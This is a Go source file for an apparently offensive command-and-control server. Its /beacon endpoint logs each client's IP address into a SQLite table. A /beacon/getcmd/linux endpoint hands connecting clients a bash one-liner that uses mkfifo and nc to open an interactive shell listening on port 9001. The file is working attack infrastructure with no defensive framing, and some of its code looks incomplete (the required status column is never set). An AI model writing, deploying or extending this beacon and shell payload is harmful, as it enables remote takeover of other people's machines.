package main

import (
    "fmt"
    "log"
    "net/http"
    "net"
    "strings"
    "database/sql"
    "time"
    _ "github.com/mattn/go-sqlite3"
)

//thanks stack overflow twinks <3
func getip() net.IP {
    conn, err := net.Dial("udp", "8.8.8.8:8080")
    if err != nil {
        log.Fatal(err)
    }
    defer conn.Close()
    localAddress := conn.LocalAddr().(*net.UDPAddr)
    return localAddress.IP
}

func getreqip(r *http.Request) string {
    ip := r.Header.Get("X-Real-Ip")
    if ip == "" {
        ip = r.Header.Get("X-Forwarded-For")
    }
    if ip == "" {
        host, _, err := net.SplitHostPort(r.RemoteAddr)
        if err != nil {
            return r.RemoteAddr
        }
        ip = host
    } else {
        if comma := net.ParseIP(ip); comma == nil {
            ip = ip[:strings.IndexByte(ip, ',')]
        }
    }
    return ip
}

func initdb() *sql.DB {


    db, err := sql.Open("sqlite3", "../bin/assets/db/db.db")
    if err != nil {
        log.Fatal("SE1V1; database error => couldnt open database file =>", err) //error, variant
    }else {                                                                     //TODO: docs for error messages
        log.Println("DB flatfile opened; success!")
    }
    crttable := `
        CREATE TABLE IF NOT EXISTS "users" (
        	id INTEGER PRIMARY KEY AUTOINCREMENT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            modified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        	ip VARCHAR(45) NOT NULL UNIQUE,
         	status VARCHAR(255) NOT NULL
         );
    `
    _, err = db.Exec(crttable)
    if err != nil {
        log.Fatal("SE1V2; database error => couldnt create table =>", err)
    }
    log.Println("Table created or exists; success!")
    return db
}

func main() {
	db := initdb()
	ip := getip().String()
	defer db.Close()
	log.Println("server started at =>",ip)
	http.HandleFunc("/beacon/getcmd/linux", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("bash -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 9001 > /tmp/f 2>/dev/null'"))
		fmt.Println("client pulled cmd")
	})
	http.HandleFunc("/beacon", func(w http.ResponseWriter, r *http.Request) {
		cliip := getreqip(r)

		// TODO: add timer for status

		fmt.Println("Request recieved <=", cliip)
		insert := `INSERT INTO users (ip) VALUES (?)
				   ON CONFLICT(ip) DO UPDATE SET modified_at = CURRENT_TIMESTAMP;`
    	_, err := db.Exec(insert, cliip)
    	if err != nil {
        	log.Fatal("SE1V3; database error => couldnt insert data =>", err)
     	}else{
        	log.Println("data inserted into/updated db; success!")
      	}

	})
	log.Fatal(http.ListenAndServe(":8080", nil))
}
